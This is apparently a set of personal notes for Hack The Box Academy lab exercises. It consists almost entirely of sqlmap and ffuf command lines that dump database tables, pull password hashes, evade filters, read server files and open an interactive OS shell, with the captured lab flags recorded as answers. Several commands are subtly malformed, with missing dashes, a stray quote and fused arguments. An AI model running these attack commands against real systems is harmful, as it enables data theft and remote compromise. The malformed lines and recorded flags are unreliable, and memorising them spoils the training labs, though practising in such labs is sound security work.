```bash
# What's the contents of table flag2? (Case #2)
sqlmap  --batch --dump -T flag2 --forms --crawl=2
# HTB{700_much_c0n6r475_0n_p057_r3qu357}

# What's the contents of table flag3 (Case#3)
sqlmap -u 94.237.49.212:33817/case2.php --cookie='id=1*' --dump --batch -T flag3 --level=5 --risk=3
# HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

# What's the contents of table flag4 (Case #4)
sqlmap -r req.txt-u 94.237.49.212:33817/case2.php/?id=1
# HTB{j450n_v00rh335_53nd5_6r475}
```

```bash
# What's the contents of table flag1 in testdb database (Case #1)
sqlmap -u 94.237.50.13:51001/case1.php/ -D testdb -T flag1 --batch --dump --crawl 2
```

```bash
# What's the name of the column containing "style" in it's name (Case #1)
# sqlmap -u "83.136.251.63:57001" --schema
sqlmap -u "83.136.251.63:57001" --search -C style --random-agent --tamper=space2comment

# What's the Kimberly user's password? (Case #1)
sqlmap -u 94.237.63.201:36417" --dump users --passwords crawl=2
```

```bash
# What's the contents of table flag8? (Case #8)
sqlmap -u 83.136.254.233:59619/case8.php -T flag8 --batch --dump --csrf-token="t0ken" --crawl=2 --forms --random-agent 
# HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}

# What's the contents of table flag9? (Case #9)
sqlmap -u " 83.136.254.233:59619/case9.php/id=1&uid=4118292662" -T flag9 --batch --dump --randomize=uid --crawl=2 --random-agent
# HTB{700_much_r4nd0mn355_f0r_my_74573}

# What's the contents of table flag10? (Case #10)
# 1
proxychains4 -q -f <(echo "strict_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nhttp 192.168.1.1 8080")
# 2
proxychains4 -q -f <(echo "strict_chain\nremote_dns_-subnet 224\ntcp_read_time_out15000\ntcp_connect_time_out8000\n[ProxyList]\nhttp 192.168.1.1 8080") sqlmap -u "83.136.254.233:59619/case10.php/?id=1&uid=4118292662" -T flag10 --dump --randomize=uid --crawl=2 --random-agent --tamper=space2comment -v 1 --level=3 risk=2


# What's the contents of table flag11? (Case #11)

sqlmap -u "94.237.54.41:34291/case11.php/?id=1" -T flag11 --dump --crawl=2 --tamper=space2comment

```

```bash
# Try to use SQLMap to read the file "/var/www/html/flag.txt".
sqlmap -u "http://94.237.63.201:48886" --file-read "/var/www/html/flag.txt"
# HTB{5up3r_u53r5_4r3_p0w3rful!}

# Use SQLMap to get an interactive OS shell on the remote host # and try to find another flag within the host.
# The flag is in a very common directory!
sqlmap -u "http://94.237.63.201:48886" --os-shell --crawl=2 --technique=E
# HTB{n3v3r_run_db_45_db4}

```

```bash
# What's the contents of the table final_flag?

``` 



```bash
# values generation 1 to 1000
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```


```bash
# id value fuzzing
ffuf -w ids.txt:FUZZ -u http:83.136.255.180:43420 -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

```bash
# parameter fuzzing
# 94.237.49.178:41421
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://admin.academy.htb:41421/admin/admin.php?FUZZ=key" -fs 798
```
